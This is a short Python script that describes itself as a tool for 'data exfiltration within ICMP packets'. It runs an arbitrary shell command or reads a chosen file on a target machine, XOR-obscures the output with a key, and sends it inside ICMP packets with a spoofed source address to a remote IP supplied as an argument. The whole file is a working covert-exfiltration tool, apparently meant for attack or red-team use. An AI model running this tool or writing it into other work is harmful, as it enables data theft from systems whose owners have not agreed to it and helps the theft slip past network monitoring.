#!/usr/bin/env python3

from scapy.all import *
import argparse as ap
import subprocess
import random as rd
import string

def collectData(command, file):
    print('1')
    data = None
    if command != None:
        cmdresult = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        data = (cmdresult.stdout.read()).decode('utf-8')
    if file != None:
        with open(file, 'r') as f:
            data = f.read()
    return data

def XOREncode(data, key):
    print('2')
    xoreddata = ''.join(chr(ord(charData) ^ ord(key[idxData%len(key)])) for idxData, charData in enumerate(data))
    return xoreddata

def sendData(data, ip):
    print('3')
    pckt = IP(dst=ip, src='10.10.10.10')/ICMP()/Raw(load=data)
    send(pckt, iface='Intel(R) Dual Band Wireless-AC 3168')

def main():
    parser = ap.ArgumentParser(description="Data exfiltration within ICMP packets.")
    parser.add_argument('ip', help='The IP address to send the data to.')
    parser.add_argument('key', help='The key to encrypt the data.')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-c', '--command', default=None, help='A command to be executed in the target machine.')
    group.add_argument('-f', '--file', default=None, help='The full path of a file to exfiltrate.')
    args = parser.parse_args()

    data = collectData(args.command, args.file)
    if data != None:
        xoreddata = XOREncode(data, args.key)
        sendData(xoreddata, args.ip)
    else:
        print('Nothing to send. Aborting operation...')
        exit(1)

if __name__ == '__main__':
    main()
